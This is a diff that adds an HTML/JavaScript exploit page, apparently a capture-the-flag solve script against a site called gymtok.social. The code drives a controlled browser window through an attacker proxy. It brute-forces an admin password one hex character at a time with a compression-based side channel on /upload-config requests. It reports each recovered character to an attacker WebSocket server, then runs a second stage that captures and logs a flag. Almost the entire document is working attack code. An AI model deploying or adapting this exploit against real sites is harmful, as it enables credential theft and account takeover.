@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<a href="https://gymtok.social/" target="_blank">Login</a><br>
+<button id="go">Go</button><br>
+<script>
+    const query = new URLSearchParams(location.search);
+    let pw = query.get('pw') ?? '';
+    const base = query.get('base') ?? 'https://gymtok.social';
+    const proxy = query.get('proxy') ?? `${location.hostname}:1338`;
+    const wsUrl = query.get('ws') ?? relUrl({ protocol: 'ws', pathname: '/ws/' });
+    const stepDelay = parseInt(query.get('step') ?? '500');
+    const autoStart = query.has('auto');
+    const skipStage1 = query.has('skip1');
+    const skipStage2 = query.has('skip2');
+
+    function relUrl(opts) {
+        const u = new URL(location.href);
+        for (const k in opts) {
+            u[k] = opts[k];
+        }
+        return u.href;
+    }
+    async function load(elem, url) {
+        elem.src = url;
+        return new Promise((resolve, reject) => {
+            elem.onload = resolve;
+            elem.onerror = reject;
+        });
+    }
+    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
+
+    async function connectWs() {
+        const ws = new WebSocket(wsUrl);
+        return new Promise(resolve => ws.addEventListener('open', () => resolve(ws), { once: true }));
+    }
+    function send(ws, msg) {
+        ws.send(JSON.stringify(msg));
+    }
+    async function recv(ws) {
+        return new Promise(resolve => ws.addEventListener('message', e => {
+            try {
+                resolve(JSON.parse(e.data));
+            } catch (err) {
+                resolve(e.data);
+            }
+        }, { once: true }));
+    }
+
+    async function pwn() {
+        let win;
+        // pop-under to speed things up (avoids inactive tab throttling)
+        if (window.opener) {
+            win = window.opener.w1;
+            await sleep(1_000);
+        } else {
+            // the window to control
+            window.w1 = open('about:blank');
+            // the window where the exploit actually runs
+            const params = new URLSearchParams(location.search);
+            params.set('auto', '1');
+            const autoUrl = relUrl({ search: '?' + params.toString() });
+            window.w2 = open(autoUrl);
+            // don't do anything in this window anymore (it's just a holder for w1)
+            return;
+        }
+
+        const ws = await connectWs();
+        function log(...args) {
+            console.log(...args);
+            send(ws, { action: 'log', data: args.join(' ') });
+        }
+        function httpLog(msg) {
+            fetch('/log?msg=' + encodeURIComponent(msg));
+        }
+
+        const test = await recv(ws);
+        log('test:', test);
+        if (!skipStage1) {
+            await stage1();
+        }
+        if (!skipStage2) {
+            await stage2();
+        }
+
+        async function stage1() {
+            // make the browser accept HTTP/2 and cache the favicon
+            log('Priming...');
+            win.location = `${base}/favicon.ico?cdn=${proxy}`;
+            await sleep(1_000);
+    
+            const alphabet = '0123456789abcdef';
+            const suffix = '    ' + 'Z'.repeat(1024); // compression only for bodies > 1024 bytes
+    
+            while (pw.length < 16) {
+                const prefix = `admin:${pw}`;
+    
+                send(ws, { action: 'record' });
+                await sleep(stepDelay);
+    
+                for (const char of ['', ...alphabet]) {
+                    //log(`Trying ${char}`);
+                    const url = `${base}/upload-config?name=${encodeURIComponent(prefix + char + suffix)}`;
+                    try {
+                        win.location = url;
+                        await sleep(250);
+                    } catch (e) {
+                        log(`  Failed to load ${url}`);
+                        console.error(e);
+                    }
+                }
+    
+                send(ws, { action: 'stop' });
+                const result = await recv(ws);
+                // log('result:', result);
+                if (result.action === 'char') {
+                    pw += result.data;
+                    send(ws, { action: 'log', data: pw });
+                } else {
+                    log('Failed to find next character. Retrying...');
+                }
+    
+                log(pw);
+            }
+            log('Password:', pw);
+        }
+
+        async function stage2() {
+            log('Starting stage 2...');
+            // we're ready for stage 2
+            send(ws, { action: 'stage2' });
+            send(ws, { action: 'creds', data: pw });
+            // wait for the server to be ready
+            log('go2:', await recv(ws));
+    
+            window.addEventListener('message', e => {
+                log('Flag:', e.data);
+                httpLog('Flag:', e.data);
+            });
+    
+            // cause a request to clear the proxy's accept queue
+            win.close();
+            fetch(`${base}/upload-config`);
+            log('Waiting for proxy to be ready');
+            await sleep(1_000);
+            const win2 = window.open(`${base}/upload-config?cdn=${proxy}`);
+            await sleep(1_000);
+            win2.location = `${base}/`;
+        }
+    }
+
+    go.onclick = () => {
+        pwn();
+    };
+    if (autoStart) {
+        go.click();
+    }
+</script>
